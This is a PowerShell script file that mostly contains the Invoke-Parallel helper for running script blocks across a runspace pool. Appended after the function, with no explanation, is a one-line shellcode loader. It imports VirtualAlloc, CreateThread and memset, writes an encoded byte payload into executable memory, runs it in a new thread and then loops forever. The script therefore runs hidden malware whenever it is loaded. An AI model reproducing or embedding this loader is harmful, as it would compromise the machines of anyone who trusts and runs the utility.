function Invoke-Parallel {
    
    [cmdletbinding(DefaultParameterSetName='ScriptBlock')]
    Param (
        [Parameter(Mandatory=$false,position=0,ParameterSetName='ScriptBlock')]
        [System.Management.Automation.ScriptBlock]$ScriptBlock,

        [Parameter(Mandatory=$false,ParameterSetName='ScriptFile')]
        [ValidateScript({Test-Path $_ -pathtype leaf})]
        $ScriptFile,

        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [Alias('CN','__Server','IPAddress','Server','ComputerName')]
        [PSObject]$InputObject,

        [PSObject]$Parameter,

        [switch]$ImportVariables,
        [switch]$ImportModules,
        [switch]$ImportFunctions,

        [int]$Throttle = 20,
        [int]$SleepTimer = 200,
        [int]$RunspaceTimeout = 0,
        [switch]$NoCloseOnTimeout = $false,
        [int]$MaxQueue,

        [validatescript({Test-Path (Split-Path $_ -parent)})]
        [switch] $AppendLog = $false,
        [string]$LogFile,

        [switch] $Quiet = $false
    )
    begin {
        
        
        if( -not $PSBoundParameters.ContainsKey('MaxQueue') ) {
            if($RunspaceTimeout -ne 0){ $script:MaxQueue = $Throttle }
            else{ $script:MaxQueue = $Throttle * 3 }
        }
        else {
            $script:MaxQueue = $MaxQueue
        }
        $ProgressId = Get-Random
        Write-Verbose "Throttle: '$throttle' SleepTimer '$sleepTimer' runSpaceTimeout '$runspaceTimeout' maxQueue '$maxQueue' logFile '$logFile'"

        
        if ($ImportVariables -or $ImportModules -or $ImportFunctions) {
            $StandardUserEnv = [powershell]::Create().addscript({

                
                $Modules = Get-Module | Select-Object -ExpandProperty Name
                $Snapins = Get-PSSnapin | Select-Object -ExpandProperty Name
                $Functions = Get-ChildItem function:\ | Select-Object -ExpandProperty Name

                
                
                $Variables = Get-Variable | Select-Object -ExpandProperty Name

                
                @{
                    Variables   = $Variables
                    Modules     = $Modules
                    Snapins     = $Snapins
                    Functions   = $Functions
                }
            }).invoke()[0]

            if ($ImportVariables) {
                
                Function _temp {[cmdletbinding(SupportsShouldProcess=$True)] param() }
                $VariablesToExclude = @( (Get-Command _temp | Select-Object -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + $StandardUserEnv.Variables )
                Write-Verbose "Excluding variables $( ($VariablesToExclude | Sort-Object ) -join ", ")"

                
                
                
                
                $UserVariables = @( Get-Variable | Where-Object { -not ($VariablesToExclude -contains $_.Name) } )
                Write-Verbose "Found variables to import: $( ($UserVariables | Select-Object -expandproperty Name | Sort-Object ) -join ", " | Out-String).`n"
            }
            if ($ImportModules) {
                $UserModules = @( Get-Module | Where-Object {$StandardUserEnv.Modules -notcontains $_.Name -and (Test-Path $_.Path -ErrorAction SilentlyContinue)} | Select-Object -ExpandProperty Path )
                $UserSnapins = @( Get-PSSnapin | Select-Object -ExpandProperty Name | Where-Object {$StandardUserEnv.Snapins -notcontains $_ } )
            }
            if($ImportFunctions) {
                $UserFunctions = @( Get-ChildItem function:\ | Where-Object { $StandardUserEnv.Functions -notcontains $_.Name } )
            }
        }

        
            Function Get-RunspaceData {
                [cmdletbinding()]
                param( [switch]$Wait )
                
                
                Do {
                    
                    $more = $false

                    
                    if (-not $Quiet) {
                        Write-Progress -Id $ProgressId -Activity "Running Query" -Status "Starting threads"`
                            -CurrentOperation "$startedCount threads defined - $totalCount input objects - $script:completedCount input objects processed"`
                            -PercentComplete $( Try { $script:completedCount / $totalCount * 100 } Catch {0} )
                    }

                    
                    Foreach($runspace in $runspaces) {

                        
                        $currentdate = Get-Date
                        $runtime = $currentdate - $runspace.startTime
                        $runMin = [math]::Round( $runtime.totalminutes ,2 )

                        
                        $log = "" | Select-Object Date, Action, Runtime, Status, Details
                        $log.Action = "Removing:'$($runspace.object)'"
                        $log.Date = $currentdate
                        $log.Runtime = "$runMin minutes"

                        
                        If ($runspace.Runspace.isCompleted) {

                            $script:completedCount++

                            
                            if($runspace.powershell.Streams.Error.Count -gt 0) {
                                
                                $log.status = "CompletedWithErrors"
                                Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                                foreach($ErrorRecord in $runspace.powershell.Streams.Error) {
                                    Write-Error -ErrorRecord $ErrorRecord
                                }
                            }
                            else {
                                
                                $log.status = "Completed"
                                Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                            }

                            
                            $runspace.powershell.EndInvoke($runspace.Runspace)
                            $runspace.powershell.dispose()
                            $runspace.Runspace = $null
                            $runspace.powershell = $null
                        }
                        
                        ElseIf ( $runspaceTimeout -ne 0 -and $runtime.totalseconds -gt $runspaceTimeout) {
                            $script:completedCount++
                            $timedOutTasks = $true

                            
                            $log.status = "TimedOut"
                            Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                            Write-Error "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | out-string)"

                            
                            if (!$noCloseOnTimeout) { $runspace.powershell.dispose() }
                            $runspace.Runspace = $null
                            $runspace.powershell = $null
                            $completedCount++
                        }

                        
                        ElseIf ($runspace.Runspace -ne $null ) {
                            $log = $null
                            $more = $true
                        }

                        
                        if($logFile -and $log) {
                            ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1] | out-file $LogFile -append
                        }
                    }

                    
                    $temphash = $runspaces.clone()
                    $temphash | Where-Object { $_.runspace -eq $Null } | ForEach-Object {
                        $Runspaces.remove($_)
                    }

                    
                    if($PSBoundParameters['Wait']){ Start-Sleep -milliseconds $SleepTimer }

                
                } while ($more -and $PSBoundParameters['Wait'])

            
            }
        

        

            if($PSCmdlet.ParameterSetName -eq 'ScriptFile') {
                $ScriptBlock = [scriptblock]::Create( $(Get-Content $ScriptFile | out-string) )
            }
            elseif($PSCmdlet.ParameterSetName -eq 'ScriptBlock') {
                
                [string[]]$ParamsToAdd = '$_'
                if( $PSBoundParameters.ContainsKey('Parameter') ) {
                    $ParamsToAdd += '$Parameter'
                }

                $UsingVariableData = $Null

                
                

                if($PSVersionTable.PSVersion.Major -gt 2) {
                    
                    $UsingVariables = $ScriptBlock.ast.FindAll({$args[0] -is [System.Management.Automation.Language.UsingExpressionAst]},$True)

                    If ($UsingVariables) {
                        $List = New-Object 'System.Collections.Generic.List`1[System.Management.Automation.Language.VariableExpressionAst]'
                        ForEach ($Ast in $UsingVariables) {
                            [void]$list.Add($Ast.SubExpression)
                        }

                        $UsingVar = $UsingVariables | Group-Object -Property SubExpression | ForEach-Object {$_.Group | Select-Object -First 1}

                        
                        $UsingVariableData = ForEach ($Var in $UsingVar) {
                            try {
                                $Value = Get-Variable -Name $Var.SubExpression.VariablePath.UserPath -ErrorAction Stop
                                [pscustomobject]@{
                                    Name = $Var.SubExpression.Extent.Text
                                    Value = $Value.Value
                                    NewName = ('$__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                    NewVarName = ('__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                }
                            }
                            catch {
                                Write-Error "$($Var.SubExpression.Extent.Text) is not a valid Using: variable!"
                            }
                        }
                        $ParamsToAdd += $UsingVariableData | Select-Object -ExpandProperty NewName -Unique

                        $NewParams = $UsingVariableData.NewName -join ', '
                        $Tuple = [Tuple]::Create($list, $NewParams)
                        $bindingFlags = [Reflection.BindingFlags]"Default,NonPublic,Instance"
                        $GetWithInputHandlingForInvokeCommandImpl = ($ScriptBlock.ast.gettype().GetMethod('GetWithInputHandlingForInvokeCommandImpl',$bindingFlags))

                        $StringScriptBlock = $GetWithInputHandlingForInvokeCommandImpl.Invoke($ScriptBlock.ast,@($Tuple))

                        $ScriptBlock = [scriptblock]::Create($StringScriptBlock)

                        Write-Verbose $StringScriptBlock
                    }
                }

                $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($($ParamsToAdd -Join ", "))`r`n" + $Scriptblock.ToString())
            }
            else {
                Throw "Must provide ScriptBlock or ScriptFile"; Break
            }

            Write-Debug "`$ScriptBlock: $($ScriptBlock | Out-String)"
            Write-Verbose "Creating runspace pool and session states"

            
            $sessionstate = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
            if($ImportVariables -and $UserVariables.count -gt 0) {
                foreach($Variable in $UserVariables) {
                    $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Variable.Name, $Variable.Value, $null) )
                }
            }
            if ($ImportModules) {
                if($UserModules.count -gt 0) {
                    foreach($ModulePath in $UserModules) {
                        $sessionstate.ImportPSModule($ModulePath)
                    }
                }
                if($UserSnapins.count -gt 0) {
                    foreach($PSSnapin in $UserSnapins) {
                        [void]$sessionstate.ImportPSSnapIn($PSSnapin, [ref]$null)
                    }
                }
            }
            if($ImportFunctions -and $UserFunctions.count -gt 0) {
                foreach ($FunctionDef in $UserFunctions) {
                    $sessionstate.Commands.Add((New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $FunctionDef.Name,$FunctionDef.ScriptBlock))
                }
            }

            
            $runspacepool = [runspacefactory]::CreateRunspacePool(1, $Throttle, $sessionstate, $Host)
            $runspacepool.Open()

            Write-Verbose "Creating empty collection to hold runspace jobs"
            $Script:runspaces = New-Object System.Collections.ArrayList

            
            $bound = $PSBoundParameters.keys -contains "InputObject"
            if(-not $bound) {
                [System.Collections.ArrayList]$allObjects = @()
            }

            
            if( $LogFile -and (-not (Test-Path $LogFile) -or $AppendLog -eq $false)){
                New-Item -ItemType file -Path $logFile -Force | Out-Null
                ("" | Select-Object -Property Date, Action, Runtime, Status, Details | ConvertTo-Csv -NoTypeInformation -Delimiter ";")[0] | Out-File $LogFile
            }

            
            $log = "" | Select-Object -Property Date, Action, Runtime, Status, Details
                $log.Date = Get-Date
                $log.Action = "Batch processing started"
                $log.Runtime = $null
                $log.Status = "Started"
                $log.Details = $null
                if($logFile) {
                    ($log | convertto-csv -Delimiter ";" -NoTypeInformation)[1] | Out-File $LogFile -Append
                }
            $timedOutTasks = $false
        
    }
    process {
        
        if($bound) {
            $allObjects = $InputObject
        }
        else {
            [void]$allObjects.add( $InputObject )
        }
    }
    end {
        
        try {
            
            $totalCount = $allObjects.count
            $script:completedCount = 0
            $startedCount = 0
            foreach($object in $allObjects) {
                
                    
                    $powershell = [powershell]::Create()

                    if ($VerbosePreference -eq 'Continue') {
                        [void]$PowerShell.AddScript({$VerbosePreference = 'Continue'})
                    }

                    [void]$PowerShell.AddScript($ScriptBlock).AddArgument($object)

                    if ($parameter) {
                        [void]$PowerShell.AddArgument($parameter)
                    }

                    
                    if ($UsingVariableData) {
                        Foreach($UsingVariable in $UsingVariableData) {
                            Write-Verbose "Adding $($UsingVariable.Name) with value: $($UsingVariable.Value)"
                            [void]$PowerShell.AddArgument($UsingVariable.Value)
                        }
                    }

                    
                    $powershell.RunspacePool = $runspacepool

                    
                    $temp = "" | Select-Object PowerShell, StartTime, object, Runspace
                    $temp.PowerShell = $powershell
                    $temp.StartTime = Get-Date
                    $temp.object = $object

                    
                    $temp.Runspace = $powershell.BeginInvoke()
                    $startedCount++

                    
                    Write-Verbose ( "Adding {0} to collection at {1}" -f $temp.object, $temp.starttime.tostring() )
                    $runspaces.Add($temp) | Out-Null

                    
                    Get-RunspaceData

                    
                    
                    $firstRun = $true
                    while ($runspaces.count -ge $Script:MaxQueue) {
                        
                        if($firstRun) {
                            Write-Verbose "$($runspaces.count) items running - exceeded $Script:MaxQueue limit."
                        }
                        $firstRun = $false

                        
                        Get-RunspaceData
                        Start-Sleep -Milliseconds $sleepTimer
                    }
                
            }
            Write-Verbose ( "Finish processing the remaining runspace jobs: {0}" -f ( @($runspaces | Where-Object {$_.Runspace -ne $Null}).Count) )

            Get-RunspaceData -wait
            if (-not $quiet) {
                Write-Progress -Id $ProgressId -Activity "Running Query" -Status "Starting threads" -Completed
            }
        }
        finally {
            
            if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($noCloseOnTimeout -eq $false) ) ) {
                Write-Verbose "Closing the runspace pool"
                $runspacepool.close()
            }
            
            [gc]::Collect()
        }
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xad,0x55,0x49,0x87,0xd9,0xcf,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x31,0x46,0x13,0x03,0x46,0x13,0x83,0xc6,0xa9,0xb7,0xbc,0x7b,0x59,0xb5,0x3f,0x84,0x99,0xda,0xb6,0x61,0xa8,0xda,0xad,0xe2,0x9a,0xea,0xa6,0xa7,0x16,0x80,0xeb,0x53,0xad,0xe4,0x23,0x53,0x06,0x42,0x12,0x5a,0x97,0xff,0x66,0xfd,0x1b,0x02,0xbb,0xdd,0x22,0xcd,0xce,0x1c,0x63,0x30,0x22,0x4c,0x3c,0x3e,0x91,0x61,0x49,0x0a,0x2a,0x09,0x01,0x9a,0x2a,0xee,0xd1,0x9d,0x1b,0xa1,0x6a,0xc4,0xbb,0x43,0xbf,0x7c,0xf2,0x5b,0xdc,0xb9,0x4c,0xd7,0x16,0x35,0x4f,0x31,0x67,0xb6,0xfc,0x7c,0x48,0x45,0xfc,0xb9,0x6e,0xb6,0x8b,0xb3,0x8d,0x4b,0x8c,0x07,0xec,0x97,0x19,0x9c,0x56,0x53,0xb9,0x78,0x67,0xb0,0x5c,0x0a,0x6b,0x7d,0x2a,0x54,0x6f,0x80,0xff,0xee,0x8b,0x09,0xfe,0x20,0x1a,0x49,0x25,0xe5,0x47,0x09,0x44,0xbc,0x2d,0xfc,0x79,0xde,0x8e,0xa1,0xdf,0x94,0x22,0xb5,0x6d,0xf7,0x2a,0x7a,0x5c,0x08,0xaa,0x14,0xd7,0x7b,0x98,0xbb,0x43,0x14,0x90,0x34,0x4a,0xe3,0xd7,0x6e,0x2a,0x7b,0x26,0x91,0x4b,0x55,0xec,0xc5,0x1b,0xcd,0xc5,0x65,0xf0,0x0d,0xea,0xb3,0x6d,0x0b,0x7c,0xfc,0xda,0x13,0x1b,0x94,0x18,0x14,0xfc,0xf4,0x94,0xf2,0x52,0xa5,0xf6,0xaa,0x12,0x15,0xb7,0x1a,0xfa,0x7f,0x38,0x44,0x1a,0x80,0x92,0xed,0xb0,0x6f,0x4b,0x45,0x2c,0x09,0xd6,0x1d,0xcd,0xd6,0xcc,0x5b,0xcd,0x5d,0xe3,0x9c,0x83,0x95,0x8e,0x8e,0x73,0x56,0xc5,0xed,0xd5,0x69,0xf3,0x98,0xd9,0xff,0xf8,0x0a,0x8e,0x97,0x02,0x6a,0xf8,0x37,0xfc,0x59,0x73,0xf1,0x68,0x22,0xeb,0xfe,0x7c,0xa2,0xeb,0xa8,0x16,0xa2,0x83,0x0c,0x43,0xf1,0xb6,0x52,0x5e,0x65,0x6b,0xc7,0x61,0xdc,0xd8,0x40,0x0a,0xe2,0x07,0xa6,0x95,0x1d,0x62,0x36,0xe9,0xcb,0x4a,0x4c,0x03,0xc8;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

